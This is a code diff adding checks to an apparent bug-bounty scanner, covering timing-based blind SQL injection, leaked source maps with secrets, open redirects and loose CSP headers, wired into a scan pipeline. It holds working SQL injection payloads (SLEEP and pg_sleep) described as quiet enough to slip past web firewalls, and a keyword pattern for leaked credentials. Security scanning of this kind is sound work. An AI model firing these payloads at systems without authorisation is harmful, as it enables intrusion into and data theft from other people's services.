@@ -1,0 +1,393 @@
+diff --git a/backend/app/detective.py b/backend/app/detective.py
+index 57b7142..ae897e8 100644
+--- a/backend/app/detective.py
++++ b/backend/app/detective.py
+@@ -7,12 +7,27 @@ Plain-language explanation: these are small, focused checks SWAS can run
+ against a host or URL to catch a few specific, well-known, high-payout bug
+ classes that generic scanners don't reliably find:
+ 
++Batch 1:
+   1. Subdomain takeover (CNAME points to an unclaimed third-party service)
+   2. CORS misconfiguration (server blindly trusts any Origin header)
+   3. Web cache deception (private data cached under a fake static URL)
+   4. Sensitive file entropy (leaked API keys/secrets sitting in plain JS
+      or config files that were never meant to be public)
+ 
++Batch 2:
++  5. Blind SQL injection via timing (quiet, WAF-friendly SLEEP() probes -
++     no UNION/OR 1=1 noise that trips signature-based firewalls)
++  6. Leaked source maps (.js.map files that let you reconstruct original
++     source and find hardcoded secrets/internal URLs)
++  7. Open redirect (a redirect-looking parameter that sends users to an
++     attacker-controlled domain instead of validating it)
++  8. CSP weakness analysis - NOT saved as a standalone finding. A weak
++     Content-Security-Policy is routinely triaged as Informative by
++     programs unless it's demonstrated alongside a real XSS. This check
++     exists purely to log which hosts have loose CSP directives so you
++     know where to point manual/dalfox XSS testing effort - never to
++     report CSP looseness by itself.
++
+ Every function here is read-only / non-destructive - no writes, no
+ exploitation, just detection. Each returns None when nothing is found, or
+ a dict describing the finding when something is. Callers (pipeline.py)
+@@ -22,7 +37,9 @@ decide what to do with that.
+ import logging
+ import math
+ import re
++import time
+ from collections import Counter
++from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
+ 
+ import httpx
+ 
+@@ -303,3 +320,258 @@ async def check_file_entropy(url: str) -> dict | None:
+             f"leaked secrets: {summary}"
+         ),
+     }
++
++
++# ---------------------------------------------------------------------
++# 5. Blind SQL injection via timing (WAF-quiet)
++# ---------------------------------------------------------------------
++# WAFs pattern-match on loud payloads (UNION SELECT, OR 1=1). A timing
++# payload just asks the database to pause - nothing that looks like an
++# attack signature. We confirm with a 3-step measurement (baseline ->
++# delayed -> zero-delay control) specifically to rule out ordinary
++# network jitter before ever calling this a finding: a single slow
++# response proves nothing, three consistent measurements do.
++_SQLI_DELAY_SECONDS = 6
++_SQLI_TIMING_PAYLOADS = [
++    "' OR (SELECT 1 FROM (SELECT(SLEEP({delay})))x) OR '",  # MySQL, generic polyglot
++    "'||pg_sleep({delay})--",                                  # PostgreSQL
++]
++_SQLI_CONTROL_PAYLOAD = "' OR (SELECT 1 FROM (SELECT(SLEEP(0)))x) OR '"
++
++# Only worth testing params on URLs that actually have a query string -
++# no query string means nothing to inject into.
++_MAX_PARAMS_PER_URL = 2
++
++
++async def check_blind_sqli_timing(url: str) -> dict | None:
++    """
++    Tests each query parameter on `url` with a quiet SLEEP()-based timing
++    payload. If the response takes noticeably longer than baseline AND a
++    zero-delay control request on the SAME parameter returns to normal
++    speed, that's strong evidence of a real, exploitable SQL injection -
++    ordinary network slowness would affect the control request too.
++
++    Capped to the first 2 query parameters per URL to keep this fast;
++    each full test costs ~3 requests (baseline, delayed, control), one
++    of which deliberately takes _SQLI_DELAY_SECONDS to complete.
++    """
++    parsed = urlparse(url)
++    query_params = parse_qs(parsed.query)
++    if not query_params:
++        return None
++
++    logger.info("detective: checking blind SQLi timing for %s", url)
++    param_names = list(query_params.keys())[:_MAX_PARAMS_PER_URL]
++
++    try:
++        async with httpx.AsyncClient(timeout=httpx.Timeout(20.0, connect=5.0)) as client:
++            t0_start = time.monotonic()
++            await client.get(url)
++            baseline = time.monotonic() - t0_start
++
++            for param in param_names:
++                for payload_template in _SQLI_TIMING_PAYLOADS:
++                    payload = payload_template.format(delay=_SQLI_DELAY_SECONDS)
++                    mutated = _replace_query_param(parsed, query_params, param, payload)
++
++                    t1_start = time.monotonic()
++                    try:
++                        await client.get(mutated)
++                    except httpx.TimeoutException:
++                        pass  # a timeout on the delayed request is itself a data point
++                    elapsed_delayed = time.monotonic() - t1_start
++
++                    if elapsed_delayed < baseline + (_SQLI_DELAY_SECONDS - 1.0):
++                        continue  # not slow enough to be the injected delay - try next payload
++
++                    # Confirm with a same-parameter, zero-delay control -
++                    # if this also comes back slow, it's network jitter,
++                    # not the database honoring our SLEEP().
++                    control_url = _replace_query_param(
++                        parsed, query_params, param, _SQLI_CONTROL_PAYLOAD
++                    )
++                    t2_start = time.monotonic()
++                    await client.get(control_url)
++                    elapsed_control = time.monotonic() - t2_start
++
++                    if elapsed_control < baseline + 2.0:
++                        return {
++                            "vuln_type": "blind_sql_injection",
++                            "severity": "critical",
++                            "evidence": (
++                                f"{url} param '{param}': baseline={baseline:.1f}s, "
++                                f"SLEEP({_SQLI_DELAY_SECONDS}) payload={elapsed_delayed:.1f}s, "
++                                f"zero-delay control={elapsed_control:.1f}s. Timing consistently "
++                                f"follows the injected delay - confirmed blind SQL injection."
++                            ),
++                        }
++    except httpx.HTTPError as exc:
++        logger.info("detective: blind SQLi timing check failed for %s: %s", url, exc)
++    return None
++
++
++def _replace_query_param(parsed, query_params: dict, target_param: str, value: str) -> str:
++    """Rebuilds `url` with `target_param`'s value swapped for `value`,
++    leaving every other query parameter untouched."""
++    new_params = {k: v[0] for k, v in query_params.items()}
++    new_params[target_param] = value
++    new_query = urlencode(new_params)
++    return urlunparse(parsed._replace(query=new_query))
++
++
++# ---------------------------------------------------------------------
++# 6. Leaked source maps
++# ---------------------------------------------------------------------
++# Same secret-shaped-token pattern used by check_file_entropy - a source
++# map's "sourcesContent" is effectively the developer's original,
++# unminified code, so it's worth running the same entropy check against
++# it as we would any other config/JS file.
++_SECRET_KEYWORD_PATTERN = re.compile(
++    r"(AWS_SECRET|DB_PASSWORD|JWT_SECRET|API_KEY|PRIVATE_KEY|ACCESS_TOKEN)",
++    re.IGNORECASE,
++)
++
++
++async def check_source_map_leak(js_url: str) -> dict | None:
++    """
++    If `js_url` is a JS bundle, checks whether the matching `.js.map`
++    source map is also publicly exposed. If it is, and the reconstructed
++    source contains secret-shaped tokens or known secret keyword names,
++    flags it - this is the case that actually matters. A source map with
++    no secrets in it just tells you the code structure, which is a
++    real but much lower-value finding, so we deliberately don't report
++    that case at all here (avoids padding your report queue with weak
++    Informative-risk findings).
++    """
++    if not js_url.lower().split("?")[0].endswith(".js"):
++        return None
++
++    map_url = js_url + ".map"
++    logger.info("detective: checking source map leak for %s", map_url)
++
++    try:
++        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True) as client:
++            resp = await client.get(map_url)
++    except httpx.HTTPError as exc:
++        logger.info("detective: source map check failed for %s: %s", map_url, exc)
++        return None
++
++    if resp.status_code != 200:
++        return None
++
++    try:
++        data = resp.json()
++    except ValueError:
++        return None
++
++    if "sources" not in data:
++        return None  # not actually a source map, just a 200 on that path
++
++    sources_content = data.get("sourcesContent") or []
++    combined = "\n".join(s for s in sources_content if isinstance(s, str))
++    if not combined:
++        return None
++
++    keyword_hits = set(_SECRET_KEYWORD_PATTERN.findall(combined))
++    entropy_hits = []
++    for match in _TOKEN_PATTERN.finditer(combined):
++        key_name, value = match.group(1), match.group(2)
++        if _shannon_entropy(value) > 4.0:
++            entropy_hits.append(key_name)
++
++    if not keyword_hits and not entropy_hits:
++        return None
++
++    findings_summary = ", ".join(sorted(keyword_hits | set(entropy_hits))[:8])
++    return {
++        "vuln_type": "leaked_source_map",
++        "severity": "high",
++        "evidence": (
++            f"{map_url} is publicly exposed and reconstructs to original source "
++            f"containing likely secrets: {findings_summary}. Original bundle: {js_url}"
++        ),
++    }
++
++
++# ---------------------------------------------------------------------
++# 7. Open redirect
++# ---------------------------------------------------------------------
++_REDIRECT_PARAM_PATTERN = re.compile(
++    r"^(url|redirect|redirect_uri|redirect_url|return|return_url|returnto|"
++    r"return_to|next|dest|destination|continue|r|redir|target|out|forward)$",
++    re.IGNORECASE,
++)
++_OPEN_REDIRECT_PROBE = "https://swas-redirect-probe.example.com"
++
++
++async def check_open_redirect(url: str) -> dict | None:
++    """
++    If `url` has a parameter whose name looks redirect-related, replaces
++    its value with an external probe domain and checks whether the
++    server issues an HTTP redirect straight to it without validation.
++    Does not follow the redirect (follow_redirects=False) - we only need
++    to see the Location header the server itself generated.
++    """
++    parsed = urlparse(url)
++    query_params = parse_qs(parsed.query)
++    redirect_param = next(
++        (p for p in query_params if _REDIRECT_PARAM_PATTERN.match(p)), None
++    )
++    if redirect_param is None:
++        return None
++
++    mutated = _replace_query_param(parsed, query_params, redirect_param, _OPEN_REDIRECT_PROBE)
++    logger.info("detective: checking open redirect for %s", mutated)
++
++    try:
++        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=False) as client:
++            resp = await client.get(mutated)
++    except httpx.HTTPError as exc:
++        logger.info("detective: open redirect check failed for %s: %s", mutated, exc)
++        return None
++
++    location = resp.headers.get("location", "")
++    if resp.status_code in (301, 302, 303, 307, 308) and _OPEN_REDIRECT_PROBE in location:
++        return {
++            "vuln_type": "open_redirect",
++            "severity": "low",
++            "evidence": (
++                f"{url} param '{redirect_param}' causes an unvalidated HTTP "
++                f"{resp.status_code} redirect straight to an attacker-controlled "
++                f"domain: Location: {location}"
++            ),
++        }
++    return None
++
++
++# ---------------------------------------------------------------------
++# 8. CSP weakness analysis (recon-only - see module docstring)
++# ---------------------------------------------------------------------
++_WEAK_CSP_PATTERN = re.compile(r"unsafe-inline|unsafe-eval|\*", re.IGNORECASE)
++
++
++async def check_csp_weakness(url: str) -> str | None:
++    """
++    Reads the Content-Security-Policy header and returns a short
++    human-readable note if script-src/default-src looks loose enough to
++    make XSS payloads more likely to execute. Returns a plain string (or
++    None), NOT a findings dict - this is intentionally never saved to
++    the findings table. A weak CSP alone is not a vulnerability a
++    program pays for; it's context for where to spend dalfox/manual XSS
++    effort. See the module docstring for why.
++    """
++    try:
++        async with httpx.AsyncClient(timeout=_TIMEOUT, follow_redirects=True) as client:
++            resp = await client.get(url)
++    except httpx.HTTPError:
++        return None
++
++    csp = resp.headers.get("content-security-policy", "")
++    if not csp:
++        return f"{url}: no CSP header set - XSS payloads face no CSP restriction here"
++
++    directives = [d.strip() for d in csp.split(";") if d.strip()]
++    weak = [d for d in directives if _WEAK_CSP_PATTERN.search(d)]
++    if weak:
++        return f"{url}: weak CSP directive(s): {'; '.join(weak[:3])}"
++    return None
+diff --git a/backend/app/pipeline.py b/backend/app/pipeline.py
+index f07a3e2..28ed6f8 100644
+--- a/backend/app/pipeline.py
++++ b/backend/app/pipeline.py
+@@ -33,6 +33,9 @@ from . import checkpoint, detective, fp_filter, tools
+ # subdomains" is still not free, so Phase 1 keeps a conservative ceiling.
+ _TAKEOVER_CHECK_CAP = 15
+ _SENSITIVE_URL_CHECK_CAP = 15
++_SQLI_TIMING_CHECK_CAP = 8      # each test costs a deliberate multi-second delay - keep tight
++_SOURCE_MAP_CHECK_CAP = 10
++_OPEN_REDIRECT_CHECK_CAP = 15
+ 
+ logger = logging.getLogger("swas.pipeline")
+ 
+@@ -371,6 +374,13 @@ async def _phase_scan(
+         if cache_result is not None:
+             await _save_detective_finding(conn, project_id, target_id, cache_result)
+ 
++        # CSP weakness check is recon-only by design - see detective.py's
++        # module docstring and check_csp_weakness's own docstring for why
++        # this deliberately never becomes a findings-table row.
++        csp_note = await detective.check_csp_weakness(host)
++        if csp_note is not None:
++            logger.info("detective: CSP recon note: %s", csp_note)
++
+     # Detective check: sensitive file entropy. Runs against discovered
+     # historical URLs (gau/waybackurls output) that look like JS bundles,
+     # config files, or backups - capped, since this involves an actual
+@@ -393,6 +403,63 @@ async def _phase_scan(
+         if res is not None:
+             await _save_detective_finding(conn, project_id, target_id, res)
+ 
++    # Detective check: leaked source maps. Only worth trying against
++    # discovered URLs that look like JS bundles.
++    js_candidates = [url for url in discovered_urls if url.lower().split("?")[0].endswith(".js")][
++        :_SOURCE_MAP_CHECK_CAP
++    ]
++    logger.info("detective: running source map check against %d JS bundle URL(s)", len(js_candidates))
++    source_map_results = await asyncio.gather(
++        *(detective.check_source_map_leak(url) for url in js_candidates),
++        return_exceptions=True,
++    )
++    for res in source_map_results:
++        if isinstance(res, Exception):
++            logger.debug("source map check raised: %s", res)
++            continue
++        if res is not None:
++            await _save_detective_finding(conn, project_id, target_id, res)
++
++    # Detective check: open redirect. check_open_redirect() itself only
++    # acts when a query param name looks redirect-related, so we just
++    # need to feed it every URL with a query string and let it decide -
++    # filtering here again would just duplicate that logic.
++    redirect_candidates = [url for url in discovered_urls if "=" in url][:_OPEN_REDIRECT_CHECK_CAP]
++    logger.info(
++        "detective: running open redirect check against %d candidate URL(s)", len(redirect_candidates)
++    )
++    redirect_results = await asyncio.gather(
++        *(detective.check_open_redirect(url) for url in redirect_candidates),
++        return_exceptions=True,
++    )
++    for res in redirect_results:
++        if isinstance(res, Exception):
++            logger.debug("open redirect check raised: %s", res)
++            continue
++        if res is not None:
++            await _save_detective_finding(conn, project_id, target_id, res)
++
++    # Detective check: blind SQL injection via timing. The most
++    # expensive check here (each real hit costs several deliberate
++    # seconds of wait), so it only runs against URLs that already have
++    # query parameters worth injecting into, and is capped tighter than
++    # the others (_SQLI_TIMING_CHECK_CAP).
++    param_candidates = [url for url in discovered_urls if "=" in url][:_SQLI_TIMING_CHECK_CAP]
++    logger.info(
++        "detective: running blind SQLi timing check against %d parameterized URL(s)",
++        len(param_candidates),
++    )
++    sqli_results = await asyncio.gather(
++        *(detective.check_blind_sqli_timing(url) for url in param_candidates),
++        return_exceptions=True,
++    )
++    for res in sqli_results:
++        if isinstance(res, Exception):
++            logger.debug("blind SQLi timing check raised: %s", res)
++            continue
++        if res is not None:
++            await _save_detective_finding(conn, project_id, target_id, res)
++
+ 
+ # A hostname like "aem-prod.example.com" or a tech-stack detection
+ # ("AEM", "Adobe Experience Manager") is a strong recon signal, not a
